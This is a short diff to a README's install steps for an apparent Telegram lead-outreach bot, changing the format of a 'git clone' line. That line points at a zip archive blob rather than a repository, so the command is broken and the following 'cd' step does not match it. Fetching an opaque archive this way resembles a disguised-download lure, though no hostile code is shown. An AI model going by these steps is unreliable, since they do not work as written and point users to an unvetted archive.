@@ -80,7 +80,7 @@ bash
 
 
 # 1. Clone the repository
-git clone (https://github.com/rajisbossbd-hub/telegram-lead-outreach-agent-bot/blob/main/TeleOmni%20Agent%20Bot.zip)
+git clone https://github.com/rajisbossbd-hub/telegram-lead-outreach-agent-bot/blob/main/TeleOmni%20Agent%20Bot.zip
 cd TeleOmni-Agent-Bot
 # 2. Create and activate virtual environment
 python -m venv venv
